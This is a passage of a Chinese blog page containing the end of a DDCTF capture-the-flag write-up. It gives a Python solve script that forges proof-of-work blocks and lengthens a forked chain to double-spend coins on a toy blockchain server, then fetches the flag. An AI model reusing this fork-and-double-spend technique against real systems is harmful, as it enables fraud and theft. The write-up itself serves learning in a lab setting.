+send_to_server(block7)
+
+r = ss.get(url_prefix + &quot;/flag&quot;,proxies=proxies)
+print r.content
+</code></pre>
+<p><img src="/img/ddctf/1524457763.png" alt=""></p>
+<h4 id="不利用后门"><a href="#不利用后门" class="headerlink" title="不利用后门"></a>不利用后门</h4><p><img src="/img/ddctf/1524459681.png" alt=""></p>
+<pre><code class="python"># -*- encoding: utf-8 -*-
+import btc
+import rsa, uuid, json, copy
+import requests
+import re
+
+
+
+genesis_block = &quot;f91baf7a24ab07a0361e27e8527ec951feecc8cd4a67ef75e45059cf09dcdf76&quot;
+hacker_input = &quot;08e90dc1-2545-43fd-8ee4-c02b87d92899&quot;
+hacker_signature = &quot;5415d3901c9e497344e62aa7515d64e79ab5ef1d77556187b22f7c3909555f38579f39b2a07e6d84addd40eebdc55757&quot;
+shop_address = &quot;c4a5cb163786cc944c488df9c8a5143356aecc87a8854c76fbb76f5715b947d7be5ddcc9c69d46b904a857ee9437c71b&quot;
+
+txout_id = str(uuid.uuid4())
+proxies = {&quot;http&quot;:&quot;http://127.0.0.1:8080&quot;}
+url_prefix = &quot;http://localhost:5000/b9af31f66147e&quot;
+ss = requests.session()
+ss.cookies.set(&quot;session&quot;,&quot;.eJzNVtuK20gU_JXFz_PQrcvYDuyDjWwjk26hcctK9xKCbpbUkjzD2BNZCvPvWz25bTxhYWGzrMDogtynuk5VHX2apO191pwmbz5NKKFTJ6e3lpsRu8imNk1ca55T256RWTIlc8eeUTpz7flhmsyy1KK3Bc1vp3mWZ_aBZGaNKjlV5vxbOnkzYWJx4eNdw4QceMx6Zu01H9lFimgI4vDCRuYwr6r4uHC5h2uxcrhgrtJ5FWx4zfTKUmLdcJ030rrTzJK97H__ffJ8M6mKuqzOkzfWzeR4f8yKb0Xlbtmm75ak2C3rdDPXyZc_PDwWH78j000fbCRlne8GBt247oCQSLGuVMwbJVY208uaj0AnGpeNkaNEA3RbrUREuBVegKxmG95yIFObu1otPhc6PybHU5Kd6_sjaP3jPR5ZczI7uFY6n99aU3pwMyehSZHlBZ1aJJ3OEnc-t91ZMZ-5Vla4zjSnBU1JVhhu8zR_zewvxP-VWXrN7G619sNdX-52y6XYLaPdKirDZh3shmUgaFa9Ylnp5iI7ILNWA9-gmpdXzGMWi6OBWxHQ-LaKmcvFulPxXsux0sq7q9DvVumMKhFS5kWuRN-D2KCUNi9_yvI1P90dFMRIIO5qrkuLi7zjXjOAFwokDfeykVv7Sgog1JHLu3XFRihS85rH_iA1UG2MEhuqOlx3oc2_CKk-PjydX0p-LuVVbSCWjRxXZ6ZB7Y4QZqnmrahabOAsxwWWK22F8oHXuJPn9zeT-6fz10WSPH_8hjvwsp53hh3sebxrpd5WgbeiTIQj3AD8Le4byj2_Z2ILh8gLekn4qCq4xwVWm40rJxBsAFsDrnv0G87jneokkbqB4zKbecsKwLC_zJHjFhoJKXQymv0l3f3TEdjmL8fNj8Qqb98ytI3rkKgXkrddEENsncJzNkod2rC2wy02SNgZ7ID4lSvjbcu90uEb2BhChCxaLqQhmcgvLa3zvygnvEiLoyfROfAWhNeEIBFakKrRm3MQIy3GJZSCdNFtPXl-vrmmUuwhb6VlDHF1_qB0iZCRVI55A4u0MmYDQz9kt234xh9AMeFe6AQbf8Q7CKWwh0BHFvNa6ZWjvBbPTCC9SIrwzqcmsAIP64I-heCSFiPYHWqtfqCSXrEYGFGPygSaxUa_N5hYB4Y2aLtoLBWvejBjqQ621aqFJC0eGwmENot91Nw2L-Eqqk6JJWhCzcUrFpmIkAJQTyfPsmOOMtIE3LdoRuD5ZxmHoKN0mc471oUELEKbp7o8Juenx-K7xrG_i6kfoKYcW3SygcygAESPRPc5bKU8ifsMnfapiuVFQWZcRBYTpS214T_XwNkHIqI8liM4gFJwNnYTC1sJ1QQwP6II9ly2Kt7CU3h3jGx45tnk6GFO0wTDx3KSlEwTYt_SwpoWSM1pkc1deiiKLJtluZPcTovD1C0cl7jz7EDmyNHD9PZVjv7KhPqao-Q6R_ebqvXXdw9pvB99bzG-JQ9VWs-gxoXrr_i9jF2t4ssptf0ytZxSHrcPaXfCtSwzjNDUcht_s62S-PIxfxeWqpsP5h7v_GTSeYv-X__9fNJdc-uVaLrsmcZZ-K4SJTHZBFHA29vKyJ97Rtwc-WMEsED--hdk4Mg2mE-6hch9UxFxsUKAIlzLHzP476L0_-R_8nLcXA8piVDz4QI2YILUDK4BIkPEoLwthBgNbMN6rhszDvAptYdNEdadCXhJsTczoLArgy7qAw8fVK-z9J8PqOsUMObDmmVxLE716cPLF-OH_8xHw_3T44e8BpfHHDIjz38CpAVruA.Db75Tw.QeSMoxmB0xyGIo4lNdIZIxxJbXw&quot;)
+
+
+r = ss.get(url=url_prefix+&quot;/&quot;,proxies=proxies)
+
+
+#工作量证明
+def pow(b, difficulty, msg=&quot;&quot;):
+    nonce = 0
+    while nonce&lt;(2**32):
+        b[&#39;nonce&#39;] = msg+str(nonce)
+        b[&#39;hash&#39;] = btc.hash_block(b)
+        block_hash = int(b[&#39;hash&#39;], 16)
+        if block_hash &lt; difficulty:
+            return b
+        nonce+=1
+
+#构造一个空块
+def empty_block(msg, prevHash):
+    b={}
+    b[&quot;prev&quot;] = prevHash
+    b[&quot;transactions&quot;] = []
+    b = pow(b, btc.DIFFICULTY, msg)
+    return b
+
+def myprint(b):
+    print(json.dumps(b))
+    print(len(json.dumps(b)))
+
+def send_to_server(b):
+    data = json.dumps(b)
+    r = ss.post(url = url_prefix+&quot;/create_transaction&quot;,data = data, headers = {&quot;content-type&quot;:&quot;application/json&quot;},proxies = proxies)
+    print r.content
+
+
+# 从创世块开始就不承认，构造更长的链，不承认黑客已经转走钱，直接转给商店
+# 从银行直接转币到商店
+print(&quot;从银行直接转币到商店&quot;)
+block1 = {}
+block1[&quot;prev&quot;] = genesis_block
+tx = {&quot;input&quot;:[hacker_input],&quot;output&quot;:[{&quot;amount&quot;:1000000, &#39;id&#39;:txout_id,&#39;addr&#39;:shop_address}],&#39;signature&#39;:[hacker_signature]}
+tx[&quot;output&quot;][0][&quot;hash&quot;] = btc.hash_utxo(tx[&quot;output&quot;][0])
+tx[&#39;hash&#39;] = btc.hash_tx(tx)
+block1[&quot;transactions&quot;] = [tx]
+block1 = pow(block1, btc.DIFFICULTY)
+myprint(block1)
+send_to_server(block1)
+
+# 构造空块增加分叉链长度，使分叉链最长
+# 空区块
+print(&quot;空区块&quot;)
+block2 = empty_block(&quot;myempty1&quot;, block1[&quot;hash&quot;])
+myprint(block2)
+send_to_server(block2)
+
+# 创建空区块，触发下面的转走币
+print(&quot;创建空区块，触发下面的转走币&quot;)
+block3 = empty_block(&quot;myempty2&quot;, block2[&quot;hash&quot;])
+myprint(block3)
+send_to_server(block3)
+
+# 商店自动转走币
+# 钻石+１
+
+# 不承认被转走了钱，即系统转走钱之前的那个块再次分叉，添加空块
+# 创建空区块，
+print(&quot;空区块&quot;)
+block4 = empty_block(&quot;myempty3&quot;, block3[&quot;hash&quot;])
+myprint(block4)
+send_to_server(block4)
+
+
+# 创建空区块，触发分叉2商店转走币
+print(&quot;创建空区块，触发分叉2商店转走币&quot;)
+block5 = empty_block(&quot;myempty4&quot;, block4[&quot;hash&quot;])
+myprint(block5)
+send_to_server(block5)
+
+# 分叉2商店转走币
+# 钻石+１
+
+r = ss.get(url_prefix + &quot;/flag&quot;,proxies=proxies)
+print r.content</code></pre>
+<p><img src="/img/ddctf/1524459715.png" alt=""></p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至3213359017@qq.com </span>
+    </div>
+</article>
+
+
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry"><span class="miit">
+                <img src="/img/gov.png" title="中华人民共和国工业和信息化部">
+                <a href="http://beian.miit.gov.cn/" target="_blank" rel="noopener">粤ICP备19027389号</a>
+        </span>
+    
+    ©2015-2020 UltramanGaia
+</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+    #post .pjax article .article-entry>ol, #post .pjax article .article-entry>ul, #post .pjax article>ol, #post .pjax article>ul{
+        border: #e2dede solid 1px;
+        border-radius: 10px;
+        padding: 10px 32px 10px 56px;
+    }
+    #post .pjax article .article-entry li>ol, #post .pjax article .article-entry li>ul,#post .pjax article li>ol, #post .pjax article li>ul{
+        padding-top: 5px;
+        padding-bottom: 5px;
+    }
+    #post .pjax article .article-entry>ol>li, #post .pjax article .article-entry>ul>li,#post .pjax article>ol>li, #post .pjax article>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    #post .pjax article .article-entry li>ol>li, #post .pjax article .article-entry li>ul>li,#post .pjax article li>ol>li, #post .pjax article li>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
